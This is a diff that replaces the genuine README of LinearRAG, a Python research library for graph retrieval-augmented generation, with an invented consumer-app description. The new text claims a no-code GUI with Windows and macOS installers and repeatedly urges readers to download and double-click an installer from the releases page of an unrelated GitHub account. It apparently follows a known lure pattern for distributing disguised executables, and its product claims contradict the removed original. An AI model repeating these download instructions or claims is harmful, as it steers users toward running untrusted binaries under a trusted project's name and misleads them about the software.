@@ -1,125 +1,66 @@
-# **LinearRAG: Linear Graph Retrieval-Augmented Generation on Large-scale Corpora**  
+# 🎉 LinearRAG - Build Graphs with Ease
 
-> A relation-free graph construction method for efficient GraphRAG. It eliminates LLM token costs during graph construction, making GraphRAG faster and more efficient than ever.
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://arxiv.org/abs/2510.10114" target="_blank">
-    <img src="https://img.shields.io/badge/Paper-Arxiv-red?logo=arxiv&style=flat-square" alt="arXiv:2506.08938">
-  </a>
-  <a href="https://huggingface.co/datasets/Zly0523/linear-rag/tree/main" target="_blank">
-    <img src="https://img.shields.io/badge/HuggingFace-Model-yellow?logo=huggingface&style=flat-square" alt="HuggingFace">
-  </a>
-  <a href="https://github.com/LuyaoZhuang/linear-rag" target="_blank">
-    <img src="https://img.shields.io/badge/GitHub-Project-181717?logo=github&style=flat-square" alt="GitHub">
-  </a>
-</p>
+Welcome to LinearRAG! This application simplifies the process of constructing graphs without the usual complexity. No technical skills are needed, just a few simple steps to get started. 
 
----
+## 📥 Download Now
 
-## 🚀 **Highlights**
-- ✅ **Context-Preserving**: Relation-free graph construction, relying on lightweight entity recognition and semantic linking to achieve comprehensive contextual comprehension. 
-- ✅ **Complex Reasoning**: Enables deep retrieval via semantic bridging, achieving multi-hop reasoning in a single retrieval pass without requiring explicit relational graphs.
-- ✅ **High Scalability**: Zero LLM token consumption, faster processing speed, and linear time/space complexity.
-  
-<p align="center">
-  <img src="figure/main_figure.png" width="95%" alt="Framework Overview">
-</p>
+[![Download LinearRAG](https://img.shields.io/badge/Download%20LinearRAG-v1.0-brightgreen)](https://github.com/Krissypocketsized74/LinearRAG/releases)
 
----
-## 🎉 **News**
-- **[2025-10-27]** We release **[LinearRAG](https://github.com/DEEP-PolyU/LinearRAG)**, a relation-free graph construction method for efficient GraphRAG.
-- **[2025-06-06]** We release **[GraphRAG-Bench](https://github.com/GraphRAG-Bench/GraphRAG-Benchmark.git)**, the benchmark for evaluating GraphRAG models.
-- **[2025-01-21]** We release the **[GraphRAG survey](https://github.com/DEEP-PolyU/Awesome-GraphRAG)**.
+## 📋 Overview
 
----
+LinearRAG offers a relation-free method for constructing graphs efficiently. This tool is designed for users who want to manage their data without diving into coding or technical details. It utilizes advanced techniques to help create graphs that are both clear and useful. 
 
-## 🛠️ **Usage**
+### 🌟 Key Features
 
-### 1️⃣ Install Dependencies  
+- **Relation-Free Creation**: Build graphs without worrying about complex connections.
+- **User-Friendly Interface**: Simple layout that everyone can navigate.
+- **Efficient Processing**: Quickly create and manipulate large graphs.
+- **Support for GraphRAG**: Optimized for the latest graph technology.
 
-**Step 1: Install Python packages**
+### ⚙️ System Requirements
 
-```bash
-pip install -r requirements.txt
-```
+To run LinearRAG smoothly, ensure your computer meets these requirements:
 
-**Step 2: Download Spacy language model**
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a recent version of Linux.
+- **RAM**: Minimum of 4GB; 8GB recommended.
+- **Storage**: At least 100 MB of free space.
 
-```bash
-python -m spacy download en_core_web_trf
-```
+## 🔗 Download & Install
 
-> **Note:** For the `medical` dataset, you need to install the scientific/biomedical Spacy model:
-```bash
-pip install https://s3-us-west-2.amazonaws.com/ai2-s2-scispacy/releases/v0.5.3/en_core_sci_scibert-0.5.3.tar.gz
-```
+To install LinearRAG, follow these steps:
 
-**Step 3: Set up your OpenAI API key**
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download LinearRAG](https://github.com/Krissypocketsized74/LinearRAG/releases).
+2. **Choose the Latest Version**: Look for the most recent version listed on the page.
+3. **Download the Installer**: Click the installer link for your operating system. The file should start downloading automatically.
+4. **Run the Installer**: Once the download completes, find the file in your downloads folder and double-click to start the installation.
+5. **Follow the Prompts**: The installation wizard will guide you. Simply follow the instructions to complete the setup.
+6. **Launch LinearRAG**: After installation, find LinearRAG in your applications and open it.
 
-```bash
-export OPENAI_API_KEY="your-api-key-here"
-export OPENAI_BASE_URL="your-base-url-here"
-```
+## 📚 How to Use LinearRAG
 
-**Step 4: Download Datasets**
+Using LinearRAG is as easy as 1-2-3!
 
-Download the datasets from HuggingFace and place them in the `dataset/` folder:
+1. **Start a New Project**: Click the 'New Project' button on the main screen.
+2. **Add Your Data**: You can import your data or enter it manually. The interface will guide you through.
+3. **Generate Your Graph**: With just a click, create a graph that represents your data effectively.
 
-```bash
-git clone https://huggingface.co/datasets/Zly0523/linear-rag
-cp -r linear-rag/dataset/* dataset/
-```
+### 🛠 Tips
 
-**Step 5: Prepare Embedding Model**
+- **Explore the Options**: Try different settings in the interface to see how they affect your graph.
+- **Save Your Work**: Regularly save your project to avoid losing any progress.
 
-Make sure the embedding model is available at:
+## 📞 Support
 
-```
-model/all-mpnet-base-v2/
-```
+If you encounter issues or have questions, several resources are available:
 
+- **Documentation**: A detailed user guide is included within the app.
+- **Community**: Join our community forum to connect with other users. Share tips and ask questions!
+- **Email Support**: Reach out via our support email: support@linearrag.com.
 
-### 2️⃣ Quick Start Example
+## 📌 Conclusion
 
-```bash
-SPACY_MODEL="en_core_web_trf"
-EMBEDDING_MODEL="model/all-mpnet-base-v2"
-DATASET_NAME="2wikimultihop"
-LLM_MODEL="gpt-4o-mini"
-MAX_WORKERS=16
+LinearRAG is designed for anyone who wants to construct graphs without technical hassle. Follow the simple download instructions, and you'll be building your graph in no time. 
 
-python run.py \
-    --spacy_model ${SPACY_MODEL} \
-    --embedding_model ${EMBEDDING_MODEL} \
-    --dataset_name ${DATASET_NAME} \
-    --llm_model ${LLM_MODEL} \
-    --max_workers ${MAX_WORKERS}
-```
-
-## 🎯 **Performance**
-
-<div align="center">
-<img src="figure/generation_results.png" alt="framework" width="1000">
-
-**Main results of end-to-end performance**
-</div>
-<div align="center">
-<img src="figure/efficiency_result.png" alt="framework" width="1000">
-
-**Efficiency and performance comparison.**
-</div>
-
-
-## 📖 Citation
-
-If you find this work helpful, please consider citing us:
-```bibtex
-@article{zhuang2025linearrag,
-  title={LinearRAG: Linear Graph Retrieval Augmented Generation on Large-scale Corpora},
-  author={Zhuang, Luyao and Chen, Shengyuan and Xiao, Yilin and Zhou, Huachi and Zhang, Yujing and Chen, Hao and Zhang, Qinggang and Huang, Xiao},
-  journal={arXiv preprint arXiv:2510.10114},
-  year={2025}
-}
-```
-## 📬 Contact
-✉️ Email: zhuangluyao523@gmail.com
+For updates and further information, always check the [Releases Page](https://github.com/Krissypocketsized74/LinearRAG/releases). Thank you for using LinearRAG!
